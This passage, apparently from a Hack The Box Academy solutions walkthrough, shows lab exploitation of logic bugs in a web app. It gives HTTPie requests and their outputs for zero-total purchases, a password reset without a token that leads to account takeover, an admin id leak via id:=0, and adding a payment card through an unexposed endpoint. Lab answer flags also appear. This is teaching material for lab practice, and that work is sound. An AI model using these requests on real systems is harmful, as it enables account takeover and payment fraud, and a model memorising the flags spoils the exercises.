  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsIm5hbWUiOiJIVEIgU3R1ZGVudCIsInVzZXJuYW1lIjoiaHRiLXN0dWRlbnQiLCJlbWFpbCI6Imh0Yi1zdHVkZW50QGFjYWRlbXkuaHRiIiwicmVnaXN0cmF0aW9uRGF0ZSI6IjIwMjMtMDEtMDFUMDA6MDA6MDAuMDAwWiIsImN1YmVzIjozMCwic3Vic2NyaXB0aW9uIjp7InVzZXJJZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsInN1YnNjcmlwdGlvbk5hbWUiOiJmcmVlIiwiZXhwaXJlc0F0IjoiMjEwMC0wMS0wMVQwMDowMDowMC4wMDBaIn0sImlhdCI6MTY5NTkxNTU5NiwiZXhwIjoxNjk2MDAxOTk2fQ.n-FtLMJ7wlerM7J02M05WmR44Pd9_t_Y-7dhOzVLJeU",
  "message": "Logged in!"
}
```

Having attained a JWT token, students then need to get the card details of the current user (most importantly, its `id`) by sending a GET request to the `/api/payment/cards` endpoint (mapped to `src/src/controllers/payment-controller.js`, lines 8-43):

Code: shell

```shell
http GET http://STMIP:STMPO/api/payment/cards --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-lmjzvcebvu]─[~]
└──╼ [★]$ http GET http://94.237.62.195:45334/api/payment/cards --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsIm5hbWUiOiJIVEIgU3R1ZGVudCIsInVzZXJuYW1lIjoiaHRiLXN0dWRlbnQiLCJlbWFpbCI6Imh0Yi1zdHVkZW50QGFjYWRlbXkuaHRiIiwicmVnaXN0cmF0aW9uRGF0ZSI6IjIwMjMtMDEtMDFUMDA6MDA6MDAuMDAwWiIsImN1YmVzIjozMCwic3Vic2NyaXB0aW9uIjp7InVzZXJJZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsInN1YnNjcmlwdGlvbk5hbWUiOiJmcmVlIiwiZXhwaXJlc0F0IjoiMjEwMC0wMS0wMVQwMDowMDowMC4wMDBaIn0sImlhdCI6MTY5NTkxNTU5NiwiZXhwIjoxNjk2MDAxOTk2fQ.n-FtLMJ7wlerM7J02M05WmR44Pd9_t_Y-7dhOzVLJeU" | jq

{
  "cards": [
    {
      "id": "651599407998f5c5ff061491",
      "userId": "649f2893cba8d0d6e8412182",
      "name": "HTB Student",
      "endsWith": "3456",
      "expiryMonth": "12",
      "expiryYear": "2030",
      "cvc": "123",
      "balance": 5
    }
  ]
}
```

With the `id` `651599407998f5c5ff061491` of the card attained, students need to exploit the unexpected input vulnerability and perform two purchases, one for 1000 cubes costing 100 and another for a subscription with a non-existent `name` also costing 100 (therefore, the total becomes 0):

Code: json

```json
{
  "cardId": "651599407998f5c5ff061491",
  "items": [
    {
      "name": "1000",
      "category": "cubes",
      "price": 100,
      "amount": 1
    },
    {
      "name": "doesNotExist",
      "category": "subscription",
      "price": 100,
      "amount": 1
    }
  ]
}
```

Students need to send a POST request to the `/api/payment/charge` endpoint (mapped to `src/src/controllers/payment-controllers.js`, lines 45-230), passing in its body the JSON data for the two purchases and the card ID:

Code: shell

```shell
echo -n '{"cardId":"651599407998f5c5ff061491","items":[{"name":"1000","category":"cubes","price":100,"amount":1},{"name":"doesNotExist","category":"subscription","price":100,"amount":1}]}' | http POST http://STMIP:STMPO/api/payment/charge --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-lmjzvcebvu]─[~]
└──╼ [★]$ echo -n '{"cardId":"651599407998f5c5ff061491","items":[{"name":"1000","category":"cubes","price":100,"amount":1},{"name":"doesNotExist","category":"subscription","price":100,"amount":1}]}' | http POST http://94.237.62.195:45334/api/payment/charge --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsIm5hbWUiOiJIVEIgU3R1ZGVudCIsInVzZXJuYW1lIjoiaHRiLXN0dWRlbnQiLCJlbWFpbCI6Imh0Yi1zdHVkZW50QGFjYWRlbXkuaHRiIiwicmVnaXN0cmF0aW9uRGF0ZSI6IjIwMjMtMDEtMDFUMDA6MDA6MDAuMDAwWiIsImN1YmVzIjozMCwic3Vic2NyaXB0aW9uIjp7InVzZXJJZCI6IjY0OWYyODkzY2JhOGQwZDZlODQxMjE4MiIsInN1YnNjcmlwdGlvbk5hbWUiOiJmcmVlIiwiZXhwaXJlc0F0IjoiMjEwMC0wMS0wMVQwMDowMDowMC4wMDBaIn0sImlhdCI6MTY5NTkxNTU5NiwiZXhwIjoxNjk2MDAxOTk2fQ.n-FtLMJ7wlerM7J02M05WmR44Pd9_t_Y-7dhOzVLJeU" | jq

{
  "message": "Could not find a matching subscription."
}
```

Subsequently, after visiting the root webpage of the spawned target machine and signing in using the credentials `htb-student@academy.htb:HTB_@cademy_student!`, students will have enough cubes to unlock the "Introduction to Academy" module:

![[HTB Solutions/CWEE/z. images/913551678fa7854629af00572defcfd9_MD5.jpg]]

Students will attain the flag `HTB{3xp3c7_7#3_un3xp3c73d}` in the module's first section:

![[HTB Solutions/CWEE/z. images/9e973336c41db11814fd49a9872e6a24_MD5.jpg]]

Answer: `HTB{3xp3c7_7#3_un3xp3c73d}`

# Null Safety

## Question 1

### "Try the above process to identify a function vulnerable to null safety logic bugs. What is the name of one such function?"

Students first need to download [null\_safety.zip](https://academy.hackthebox.com/storage/modules/239/null_safety.zip), unzip it, and then open it in `Visual Studio Code`:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/239/null_safety.zip
unzip null_safety.zip
code null_safety/
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-edsfbv0wkd]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/239/null_safety.zip
unzip null_safety.zip
code null_safety/

--2023-09-26 19:27:26--  https://academy.hackthebox.com/storage/modules/239/null_safety.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

Within `Visual Studio Code`, students need to right-click on `src/src/controllers` and then click on `Find in Folder...`:

![[HTB Solutions/CWEE/z. images/ff8659b54f2bb3751a0732f31d89bad8_MD5.jpg]]

Subsequently, students need to turn on regular expressions support and search for the pattern `(let|var) [A-Za-z]*;`. When checking the `resetPassword` function of `src/src/controllers/users-controllers.js` (lines 272-353), students will notice that it is not initializing the variable `user` (line 275), in addition to relying on a flawed validation check against `nullability` (line 302):

![[HTB Solutions/CWEE/z. images/670dede8a2eff77620beccfb79032163_MD5.jpg]]

Answer: `resetPassword`

# Local Testing (functions) - Null Safety

## Question 1

### "The 'htb-student' user has 1000 cubes, and his user id is the same one found in the app we used for local testing. So, he makes a good target for our next attack. Try to takeover his account by exploiting the password reset bug we discussed above. You can then unlock the "Intro to Academy" module and read the flag in its first section."

Students first need to install `Docker` (if not already installed) and start it, [HTTPie](https://httpie.io/) and its [httpie-jwt-auth](https://github.com/teracyhq/httpie-jwt-auth) plugin:

Code: shell

```shell
sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
sudo apt install httpie
pip install -U httpie-jwt-auth
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-n6ljqyynzk]─[~]
└──╼ [★]$ sudo apt update
sudo apt install docker.io -y
sudo systemctl start docker
sudo apt install httpie
pip install -U httpie-jwt-auth

Get:1 https://download.docker.com/linux/debian bullseye InRelease [43.3 kB]
Ign:2 https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 InRelease
<SNIP>
```

Subsequently, students need to download [null\_safety.zip](https://academy.hackthebox.com/storage/modules/239/null_safety.zip), unzip it, and then open it in `Visual Studio Code`:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/239/null_safety.zip
unzip null_safety.zip
code null_safety/
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-edsfbv0wkd]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/239/null_safety.zip
unzip null_safety.zip
code null_safety/

--2023-09-26 19:27:26--  https://academy.hackthebox.com/storage/modules/239/null_safety.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

There are two methods to attain the `id` of the user with the email address `htb-student@academy.htb`, the first is by inspecting the `db/users.json` file:

![[HTB Solutions/CWEE/z. images/ae93089a72b84bd2709079266ee73629_MD5.jpg]]

While for the second method, it involves querying the `mongodb` database manually. To do so, within `Visual Studio Code`, students need to open a new terminal (using `Ctrl` + \`) and build the "nullsafety:latest" docker image:

Code: shell

```shell
sudo docker build --pull --rm -f "Dockerfile" -t nullsafety:latest "."
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-bdnyqosrxg]─[~/null_safety]
└──╼ [★]$ sudo docker build --pull --rm -f "Dockerfile" -t nullsafety:latest "."

Sending build context to Docker daemon   5.09MB
Step 1/24 : FROM mongo:latest
latest: Pulling from library/mongo
44ba2882f8eb: Pull complete
<SNIP>
Successfully built 557ede0e61b2
Successfully tagged nullsafety:latest
```

Subsequently, students need to run the docker container:

Code: shell

```shell
sudo docker run --rm -d -p 27017:27017/tcp -p 5000:5000/tcp -p 9229:9229/tcp nullsafety:latest
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-bdnyqosrxg]─[~/null_safety]
└──╼ [★]$ sudo docker run --rm -d -p 27017:27017/tcp -p 5000:5000/tcp -p 9229:9229/tcp nullsafety:latest

831fe1a76db7ee24621f59e7dcaa2b5a34c015775dfb9ed11e2d001c81c4f119
```

After having the container running, students need to execute the bash shell inside it and then run `mongosh`:

Code: shell

```shell
sudo docker exec -it 831fe bash
mongosh
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-bdnyqosrxg]─[~/null_safety]
└──╼ [★]$ sudo docker exec -it 831fe bash

root@831fe1a76db7:/app# mongosh
Current Mongosh Log ID: 6515fa02bad2b7fbc4316557
Connecting to:          mongodb://127.0.0.1:27017/?directConnection=true&serverSelectionTimeoutMS=2000&appName=mongosh+2.0.1
Using MongoDB:          7.0.1
Using Mongosh:          2.0.1

<SNIP>

test>
```

Students need to use the `academy` database then and retrieve the document belonging to the user with the email `htb-student@academy.htb`, attaining the `id` value of `649f2893cba8d0d6e8412182`:

Code: shell

```shell
use academy;
db.users.find({"email": "htb-student@academy.htb"});
```

```
test> use academy;

switched to db academy
academy> db.users.find({"email": "htb-student@academy.htb"});
[
  {
    _id: ObjectId("649f2893cba8d0d6e8412182"),
    name: 'HTB Student',
    username: 'htb-student',
    email: 'htb-student@academy.htb',
    password: '$2b$10$3DLtpVVg4RGTEfQVlz/dte4/KLjkYOhImY8FKlxnjyQ5VJMUVhOjG',
    registrationDate: ISODate("2023-01-01T00:00:00.000Z"),
    __v: 0
  }
]
```

With the `id` `649f2893cba8d0d6e8412182` attained, students need to exploit the null safety issue (by not passing the `token` field) to reset the password of `htb-student` by sending a POST request to the `/api/users/password/reset` endpoint (mapped to `src/src/controllers/users-controllers.js`, lines 272-353) on `STMIP`, passing along the `id` and the new password as POST parameters:

Code: shell

```shell
http POST http://STMIP:STMPO/api/users/password/reset id=649f2893cba8d0d6e8412182 password=ee8ad5c2fl9n83d | jq
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-bdnyqosrxg]─[~]
└──╼ [★]$ http POST http://83.136.252.24:41199/api/users/password/reset id=649f2893cba8d0d6e8412182 password=ee8ad5c2fl9n83d | jq

{
  "message": "Password updated successfully!"
}
```

Subsequently, after visiting the root webpage of the spawned target machine and signing in using the email `htb-student@academy.htb` and the reset password chosen previously, students will have enough cubes to unlock the "Introduction to Academy" module:

![[HTB Solutions/CWEE/z. images/1bd604ad4f00249a6e250cf9052fcd41_MD5.jpg]]

Students will attain the flag `HTB{41w4y5_c#3ck_4_nu115}` in the module's first section:

![[HTB Solutions/CWEE/z. images/a56841a3758c10ae75d3f835d4cc714b_MD5.jpg]]

Answer: `HTB{41w4y5_c#3ck_4_nu115}`

# PoC and Patching - Null Safety

## Question 1

### "Try to exploit the null bug we discussed earlier to takeover the admin account (htb-admin@hackthebox.com). To do so, you first need to identify and exploit another vulnerability that would leak his private uid, and then use it to reset his password. The admin user has unlimited cubes, so use his account to read the flag in the first section of the "Intro to Academy" module."

After spawning the target machine, students first need to install [HTTPie](https://httpie.io/) and its [httpie-jwt-auth](https://github.com/teracyhq/httpie-jwt-auth) plugin:

Code: shell

```shell
sudo apt install httpie
pip install -U httpie-jwt-auth
```

```
┌─[eu-academy-1]─[10.10.15.223]─[htb-ac-413848@htb-9ju4chiste]─[~]
└──╼ [★]$ sudo apt install httpie
pip install -U httpie-jwt-auth

Reading package lists... Done
Building dependency tree... Done
<SNIP>
```

Subsequently, students need to download [null\_safety.zip](https://academy.hackthebox.com/storage/modules/239/null_safety.zip), unzip it, and then open it in `Visual Studio Code`:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/239/null_safety.zip
unzip null_safety.zip
code null_safety/
```

```
┌─[eu-academy-1]─[10.10.14.72]─[htb-ac-413848@htb-edsfbv0wkd]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/239/null_safety.zip
unzip null_safety.zip
code null_safety/

--2023-09-26 19:00:26--  https://academy.hackthebox.com/storage/modules/239/null_safety.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

One interesting API endpoint available for unauthenticated users is `/api/users/details`, as registered in `src/src/routes/users-routes.js`:

![[HTB Solutions/CWEE/z. images/b72e96f7f19e0b43f9df0aa8f765464d_MD5.jpg]]

When checking the function invoked for this endpoint within `src/src/controllers/users-controllers.js` (lines 169-200), students will notice that it accepts two POST parameters, `id` and `email`, and based on the latter, it creates a `user` object by querying the database (lines 174-177). Moreover, it returns the `id` of the user of interest in its response by accessing/getting the `id` field of the `user` object and not the one passed in the request; thus, students need to analyze this function for possible abuse.

The function performs multiple checks for `nullability` and other edge cases against the POST `id` parameter (lines 179-183); nevertheless, they all can be bypassed. Specifically, the validation in line 181 can be bypassed by sending the value `0` for `id`; this is so because the conditional check `0 && 'STRING' !== 0` (whereby `STRING` represents the actual `id` value of the user) will evaluate to `0`, which is `false` in JS:

![[HTB Solutions/CWEE/z. images/ab8c08f24fadf5543f825fed858cbed2_MD5.jpg]]

Therefore, students first need to leak the `id` of the admin user by sending the value `htb-admin@hackthebox.com` for the `email` parameter and `0` for `id`, attaining the `id` `64f742ef9da9933e4dcdb56a` in the response (it is important that students use `id:=0`, as that makes `HTTPie` interpret the parameter's value as a number instead of a string, which is the default behavior when not including the colon before the equal sign):

Code: shell

```shell
http POST http://STMIP:STMPO/api/users/details email=htb-admin@hackthebox.com id:=0 | jq
```

```
┌─[eu-academy-1]─[10.10.15.165]─[htb-ac-413848@htb-aozc0qnha1]─[~]
└──╼ [★]$ http POST http://94.237.59.206:55496/api/users/details email=htb-admin@hackthebox.com id:=0 | jq

{
  "user": {
    "id": "64f742ef9da9933e4dcdb56a",
    "name": "HTB Admin",
    "username": "htb-admin",
    "email": "htb-admin@hackthebox.com",
    "registrationDate": "2023-01-01T00:00:00.000Z"
  }
}
```

Subsequently, students need to exploit the null safety issue (by not passing the `token` field) to reset the password of `htb-admin` by sending a POST request to the `api/users/password/reset` endpoint (mapped to `src/src/controllers/users-controllers.js`, lines 272-353), along with the `id` `64f742ef9da9933e4dcdb56a` and the new reset password as POST parameters:

Code: shell

```shell
http POST http://STMIP:STMPO/api/users/password/reset id=64f742ef9da9933e4dcdb56a password=68906e60fffc40 | jq
```

```
┌─[eu-academy-1]─[10.10.15.165]─[htb-ac-413848@htb-aozc0qnha1]─[~]
└──╼ [★]$ http POST http://94.237.59.206:55496/api/users/password/reset id=64f742ef9da9933e4dcdb56a password=68906e60fffc40 | jq

{
  "message": "Password updated successfully!"
}
```

Subsequently, after visiting the root webpage of the spawned target machine and signing in using the email `htb-admin@hackthebox.com` and the reset password chosen previously, students will have enough cubes to unlock the "Introduction to Academy" module:

![[HTB Solutions/CWEE/z. images/300a2a1fff5692dfd403409047448233_MD5.jpg]]

Students will attain the flag `HTB{nu11_n07_50_50und}` in the module's first section:

![[HTB Solutions/CWEE/z. images/bebc0695ea5f4c79e632ad71b7ec33df_MD5.jpg]]

Answer: `HTB{nu11_n07_50_50und}`

# Skill Assessment - Parameter Logic Bugs

## Question 1

### "The flag is in one of the sections within one of the modules. Try to find enough logic bugs to get to it."

Students first need to download [skills\_assessment.zip](https://academy.hackthebox.com/storage/modules/239/skills_assessment.zip), unzip it, and then open it in `Visual Studio Code`:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/239/skills_assessment.zip
unzip skills_assessment.zip
code skills_assessment/
```

```
┌─[eu-academy-1]─[10.10.14.11]─[htb-ac-413848@htb-rpjwjd12ep]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/239/skills_assessment.zip
unzip skills_assessment.zip
code skills_assessment/

--2023-10-02 14:21:20--  https://academy.hackthebox.com/storage/modules/239/skills_assessment.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

Subsequently, students need to analyze the entire codebase, hunting for logic bugs that, when chained together, can allow unlocking all modules and viewing their sections.

When checking the routes for `src/src/controllers/modules-controllers.js` mapped in `src/src/routes/modules-routes.js`, students will notice that it registers `/api/modules/:id/unlock` for unlocking modules (line 18):

![[HTB Solutions/CWEE/z. images/fe1dd947080e377e51526a0055569cdb_MD5.jpg]]

Students can hit `Ctrl` and right-click on the function's name to view its definition, found within `src/src/controllers/modules-controllers.js`, lines 80-199. After going through the function's business logic, students will understand that a module is unlocked based on a user's `subscription` or their `cubes` amount. For the `subscription` model, the function unlocks a module depending on whether its tier belongs to the user's specific subscription (lines 136-157):

![[HTB Solutions/CWEE/z. images/7c6f3c4b7deca811920c8bd6e725ba65_MD5.jpg]]

When checking the available subscription models found in `db/subscriptions.json`, students will notice that only `Platinum` and `Unlimited` grant access to all tiers:

![[HTB Solutions/CWEE/z. images/f29a5573a9e4f798ddf10d2ff2ec3b74_MD5.jpg]]

Therefore, students need to narrow their codebase analysis to find logic bugs that can grant users either the `Platinum` or `Unlimited` subscriptions.

For the `Unlimited` subscription, students will know that the back and front-end perform vigorous validation checks to disallow users to register with an email address ending with `@hackthebox.com`. For example, in `src/src/controllers/users-controllers.js` lines 41-46, the back-end disallows users that are newly registering to use an email address ending with `@hackthebox.com`:

Code: js

```js
if (email.endsWith("@hackthebox.com")) {
    return next({
      message: "Registration with @hackthebox.com email is not allowed.",
      statusCode: 422,
    });
  }
```

Moreover, in the same file, lines 182-188, the back-end prevents already existing users from updating their email address to one ending with `@hackthebox.com`:

Code: js

```js
if (email.endsWith("@hackthebox.com")) {
    return next({
      message:
        "User detail updates is disabled for @hackthebox.com domain users for security reasons.",
      statusCode: 422,
    });
  }
```

However, the back-end has no preventive validation checks to disallow users from buying/attaining the `Platinum` subscription. Thus, students must continue their codebase analysis, focusing on targeting it.

After spawning the target machine, students need to register an account by navigating to `http://STMIP:STMPO/register`:

![[HTB Solutions/CWEE/z. images/e82616534a97d62ebec21f25cebdd922_MD5.jpg]]

Subsequently, students need to view the available purchase options by clicking on "Purchase Cubes":

![[HTB Solutions/CWEE/z. images/011e7616b001e715fdcd1bcbbc19ef48_MD5.jpg]]

The front-end allows adding the `Platinum` subscription to the shopping cart:

![[HTB Solutions/CWEE/z. images/a9939ee26b2f5b3c965b02924bb24932_MD5.jpg]]

After adding it, students need to click on the account's username and then on "Cart":

![[HTB Solutions/CWEE/z. images/b51958e87b605a6020f2128f462347ca_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/cdb188589cb8a206603cb02661c91109_MD5.jpg]]

After attempting to checkout, students will notice that there are no payment cards available:

![[HTB Solutions/CWEE/z. images/64d152fdecc96caba1fb7f08c7f588fa_MD5.jpg]]

Additionally, the front-end does not provide/expose any means (i.e., forms) to add payment cards. Nevertheless, when inspecting the routes in `src/src/routes/payment-routes.js`, mapped for `src/src/controllers/payment-controllers.js`, students will notice that there is an authenticated POST `/api/payment/add` endpoint:

![[HTB Solutions/CWEE/z. images/87fbb7afd726c28e8271254e2b24f526_MD5.jpg]]

To understand how to use it, students need to view the definition of `addPaymentCard`. The function extracts the `id` of the user from the JWT, in addition to utilizing five POST parameters `name`, `number`, `expiryMonth`, `expiryYear`, and `cvc`:

![[HTB Solutions/CWEE/z. images/d66e180c21a103593832213cac35ef4e_MD5.jpg]]

The function performs no validation checks to prevent users from invoking it from the back-end. Although the back-end developer might have thought that not providing a front-end form prevents users from adding payment cards, the API endpoint is publicly accessible. However, the endpoint/function does validate the POST parameters against the `PaymentCardSchema` schema (found within `src/src/models/payment.js`, lines 64-72) by invoking `validatePaymentCardDetails`:

![[HTB Solutions/CWEE/z. images/0ed191ec4fc6d3a270f3089596c57470_MD5.jpg]]

Knowing the required POST parameters, students need to (ab)use this endpoint to add a payment card. First, students need to install [HTTPie](https://httpie.io/) and its [httpie-jwt-auth](https://github.com/teracyhq/httpie-jwt-auth) plugin (alternatively, students can use the `Network Tab` of the `Developer Tools` to attain the JWT when sending requests):

Code: shell

```shell
sudo apt install httpie
pip install -U httpie-jwt-auth
```

```
┌─[eu-academy-1]─[10.10.14.11]─[htb-ac-413848@htb-rpjwjd12ep]─[~]
└──╼ [★]$ sudo apt install httpie
pip install -U httpie-jwt-auth
Reading package lists... Done
Building dependency tree... Done
<SNIP>
```

Subsequently, students need to send a POST request to the `/api/users/login` endpoint (mapped to `src/src/controllers/users-controllers.js`, lines 125-166), passing the credentials of the registered user to attain a JWT:

Code: shell

```shell
http POST http://STMIP:STMPO/api/users/login email=pedant@htb.com password=X8ln1e | jq
```

```
┌─[eu-academy-1]─[10.10.14.11]─[htb-ac-413848@htb-rpjwjd12ep]─[~]
└──╼ [★]$ http POST http://94.237.49.11:45562/api/users/login email=pedant@htb.com password=X8ln1e | jq

{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1MWFkYTMyMjZjMmNiZjI1MWRiYzkwYiIsIm5hbWUiOiJwZWRhbnQiLCJ1c2VybmFtZSI6InBlZGFudCIsImVtYWlsIjoicGVkYW50QGh0Yi5jb20iLCJyZWdpc3RyYXRpb25EYXRlIjoiMjAyMy0xMC0wMlQxNDo1Njo1MC4yNzJaIiwiY3ViZXMiOjMwLCJzdWJzY3JpcHRpb24iOnsidXNlcklkIjoiNjUxYWRhMzIyNmMyY2JmMjUxZGJjOTBiIiwic3Vic2NyaXB0aW9uTmFtZSI6ImZyZWUiLCJleHBpcmVzQXQiOiIyMTAwLTAxLTAxVDAwOjAwOjAwLjAwMFoifSwiaWF0IjoxNjk2MjU4NjUzLCJleHAiOjE2OTYzNDUwNTN9.kBw7YKgD_EWsK0o2lRM9Wbch3xjDZU2M_bAyjEC_4iY",
  "message": "Logged in!"
}
```

With the JWT attained, students need to add a new payment card:

Code: shell

```shell
http POST http://STMIP:STMPO/api/payment/add name=paypal number=1234567890123456 expiryMonth=12 expiryYear=9999 cvc=941 --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.14.11]─[htb-ac-413848@htb-rpjwjd12ep]─[~]
└──╼ [★]$ http POST http://94.237.49.11:45562/api/payment/add name=paypal number=1234567890123456 expiryMonth=12 expiryYear=9999 cvc=941 --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1MWFkYTMyMjZjMmNiZjI1MWRiYzkwYiIsIm5hbWUiOiJwZWRhbnQiLCJ1c2VybmFtZSI6InBlZGFudCIsImVtYWlsIjoicGVkYW50QGh0Yi5jb20iLCJyZWdpc3RyYXRpb25EYXRlIjoiMjAyMy0xMC0wMlQxNDo1Njo1MC4yNzJaIiwiY3ViZXMiOjMwLCJzdWJzY3JpcHRpb24iOnsidXNlcklkIjoiNjUxYWRhMzIyNmMyY2JmMjUxZGJjOTBiIiwic3Vic2NyaXB0aW9uTmFtZSI6ImZyZWUiLCJleHBpcmVzQXQiOiIyMTAwLTAxLTAxVDAwOjAwOjAwLjAwMFoifSwiaWF0IjoxNjk2MjU4NjUzLCJleHAiOjE2OTYzNDUwNTN9.kBw7YKgD_EWsK0o2lRM9Wbch3xjDZU2M_bAyjEC_4iY" | jq

{
    "message": "Successfully added card."
}
```

After signing out and signing in again, students will notice that the card is now available for use from the front-end:

![[HTB Solutions/CWEE/z. images/42d9db32080ec8e35279077c9cc91c14_MD5.jpg]]

However, the payment card is ineffective since the back-end defaults its balance to 0. Therefore, students must continue analyzing the codebase for logic bugs, focusing on circumventing/abusing the back-end's business logic for processing and purchasing items.

When checking the routes for `src/src/controllers/payment-controllers.js`, mapped in `src/src/routes/payment-routes.js`, students will notice that it registers `/api/payment/charge` for processing payments/purchases (line 14):

![[HTB Solutions/CWEE/z. images/22aabc40959647d02edc313bdca4c4d5_MD5.jpg]]

After studying the function thoroughly, students will come to know that it performs three primary operations on the items being bought (passed in the POST parameter `items`):

1. Validating them (lines 118-202)
2. Calculating their sum (lines 205-207) (and checking the payment card's balance, lines 210-217)
3. Processing them (220-252)

The function extracts the user's id from the JWT and utilizes two POST parameters, `cardId` and `items`. On lines 123-128, students will notice that after deconstructing each `item` within `items` into `name`, `category`, `price`, and `amount`, the function validates these fields against the `CartItemSchema` by invoking `validateCartItemDetails` on them:

![[HTB Solutions/CWEE/z. images/f1ca991018a546997c5507ef8d6aad0e_MD5.jpg]]

It is crucial for students to notice that for all items being purchased, the back-end relies completely on the parameters/values that the front-end passes, instead of fetching them from the database; this allows manipulation of prices. Thus, this is a validation logic disparity bug, because although the the front-end fetches the prices of items from the database, the back-end blindly trusts the values it receives and does not query the database again.

When checking `CartItemSchema` in `src/src/models/payment.js` (lines 27-33), students will notice that `price` does not disallow negative numbers (as it lacks the [.positive()](https://github.com/jquense/yup#numberpositivemessage-string--function-schema) function):

![[HTB Solutions/CWEE/z. images/03af5ec8fbe7c849adc27748dc899e65_MD5.jpg]]

Therefore, this opens up avenues for unexpected input logic bugs. The function performs validation only on `subscriptions` and `exams`, but not `cubes`, which allows their purchase with arbitrary quantities:

![[HTB Solutions/CWEE/z. images/46bf74be901c66f81effc21d5b779926_MD5.jpg]]

Afterward, in lines 204-207, it calculates the `total` based on the `price` and `amount` fields of each `item`. While in lines 210-217, it makes sure that `total` is not 0 nor the balance of the card is less than the total. However, students will notice that regardless of the validation checks it performs against the `amount` field, it fails to check for negative numbers:

![[HTB Solutions/CWEE/z. images/e3afe3b8f63b9c427b6c3668945d8de0_MD5.jpg]]

Students need to exploit this unexpected input logic bug and the insufficient validation checks to attain the `Platinum` subscription. Since `CartItemSchema` allows negative values for `price`, students can buy the `Platinum` subscription costing 68 and any other item for a greater value but with a negative sign, resulting in a negative `total`. Therefore, the negative `total` value will bypass the validation checks imposed by the function/endpoint and result in the items purchased to be processed.

First, students need to get the `id` of the payment card created previously. When inspecting the routes in `src/src/routes/payment-routes.js`, mapped for `src/src/controllers/payment-controllers.js`, students will notice that there is an authenticated GET `/api/payment/cards` endpoint that allows retrieving details of payment cards belonging to a user:

![[HTB Solutions/CWEE/z. images/02bd3751a6dce0208240002918797dd2_MD5.jpg]]

Sending a GET request to the endpoint returns the user's payment card's `id` (and other fields):

Code: shell

```shell
http GET http://STMIP:STMPO/api/payment/cards --auth-type=jwt --auth="JWT" | jq
```

```
┌─[eu-academy-1]─[10.10.14.11]─[htb-ac-413848@htb-rpjwjd12ep]─[~]
└──╼ [★]$ http GET http://94.237.49.11:45562/api/payment/cards --auth-type=jwt --auth="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY1MWFkYTMyMjZjMmNiZjI1MWRiYzkwYiIsIm5hbWUiOiJwZWRhbnQiLCJ1c2VybmFtZSI6InBlZGFudCIsImVtYWlsIjoicGVkYW50QGh0Yi5jb20iLCJyZWdpc3RyYXRpb25EYXRlIjoiMjAyMy0xMC0wMlQxNDo1Njo1MC4yNzJaIiwiY3ViZXMiOjMwLCJzdWJzY3JpcHRpb24iOnsidXNlcklkIjoiNjUxYWRhMzIyNmMyY2JmMjUxZGJjOTBiIiwic3Vic2NyaXB0aW9uTmFtZSI6ImZyZWUiLCJleHBpcmVzQXQiOiIyMTAwLTAxLTAxVDAwOjAwOjAwLjAwMFoifSwiaWF0IjoxNjk2MjU4NjUzLCJleHAiOjE2OTYzNDUwNTN9.kBw7YKgD_EWsK0o2lRM9Wbch3xjDZU2M_bAyjEC_4iY" | jq

{
  "cards": [
    {
      "id": "651adc4626c2cbf251dbc949",
      "userId": "651ada3226c2cbf251dbc90b",
      "name": "paypal",
